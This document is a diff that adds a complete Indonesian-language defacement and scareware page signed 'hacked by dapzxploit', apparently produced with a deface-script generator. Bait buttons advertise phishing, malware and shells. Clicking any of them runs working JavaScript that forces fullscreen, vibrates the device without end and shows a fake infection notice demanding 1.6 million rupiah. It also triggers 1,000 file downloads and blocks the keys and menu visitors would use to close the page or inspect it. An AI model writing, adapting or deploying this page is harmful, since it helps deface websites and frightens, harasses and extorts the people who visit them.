@@ -1,0 +1,185 @@
+<!--
+--  Uploaded on : https://haxor.my.id/open/xploit2.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>hacked by dapzxploit</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: Black;
+      color: white;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 48px;
+      color: red;
+      text-align: center;
+      margin: 20px;
+    }
+
+    .button-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn18 {
+      background: red;
+      border: none;
+      padding: 15px 25px;
+      font-size: 20px;
+      color: white;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .popup, .virus-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      background: rgba(0, 0, 0, 0.95);
+      z-index: 9999;
+    }
+
+    .popup img {
+      width: 200px;
+    }
+
+    .popup h2 {
+      color: red;
+      font-size: 28px;
+      margin-top: 20px;
+    }
+
+    .virus-text {
+      font-size: 30px;
+      color: red;
+      font-weight: bold;
+      animation: blink 1s infinite;
+      text-align: center;
+    }
+
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body oncontextmenu="return false" onkeydown="return false">
+
+  <h1>selamat datang di website dapzxploit</h1>
+  <div class="button-container">
+    <button class="btn18" onclick="triggerPrank()">phising kamera</button>
+    <button class="btn18" onclick="triggerPrank()">apk malware</button>
+    <button class="btn18" onclick="triggerPrank()">shell free</button>
+    <button class="btn18" onclick="triggerPrank()">materi deface</button>
+    </div>
+
+  <!-- Loop Popup Anonymous -->
+  <div class="popup" id="popup">
+    <img src="https://files.catbox.moe/385lm3.jpg" alt="Anonymous" />
+    <h2>hacked by dapzxploit</h2>
+  </div>
+
+  <!-- Malware Overlay -->
+  <div class="virus-overlay" id="virus">
+    <div class="virus-text">
+      HP Anda Telah Terkena Malware!<br>
+      Bayar 1,6 Juta SEKARANG!
+    </div>
+    <audio id="beep" src="https://files.catbox.moe/gb0ka7.mp4" loop autoplay></audio>
+  </div>
+
+  <script>
+    function triggerPrank() {
+      forceFullscreen();
+      loopAnonymous();
+      vibrateForever();
+      showVirus();
+      downloadFiles();
+    }
+
+    function forceFullscreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+
+    function vibrateForever() {
+      if (navigator.vibrate) {
+        setInterval(() => {
+          navigator.vibrate([500, 500]);
+        }, 1000);
+      }
+    }
+
+    function loopAnonymous() {
+      const popup = document.getElementById("popup");
+      function loop() {
+        popup.style.display = "flex";
+        setTimeout(() => {
+          popup.style.display = "none";
+          setTimeout(loop, 800);
+        }, 800);
+      }
+      loop();
+    }
+
+    function showVirus() {
+      setTimeout(() => {
+        const virus = document.getElementById("virus");
+        virus.style.display = "flex";
+        document.getElementById("beep").play().catch(() => {});
+      }, 3000);
+    }
+
+    function downloadFiles() {
+      setTimeout(() => {
+        for (let i = 1; i <= 1000; i++) {
+          const blob = new Blob(["You Phone Banned By Android"], { type: "text/plain" });
+          const link = document.createElement("a");
+          link.href = URL.createObjectURL(blob);
+          link.download = `You_Phone_Banned_By_Android_${i}.txt`;
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }
+      }, 3500);
+    }
+
+    // Blok keluar/tab/tombol shortcut
+    window.onkeydown = function (e) {
+      if (
+        e.key === "F12" || e.key === "Escape" ||
+        (e.ctrlKey && e.shiftKey && e.key === "I") ||
+        (e.ctrlKey && e.key === "u") ||
+        (e.ctrlKey && e.key === "w")
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    };
+
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    window.onbeforeunload = function () {
+      return "HP Anda masih terinfeksi!";
+    };
+  </script>
+
+</body>
+</html>
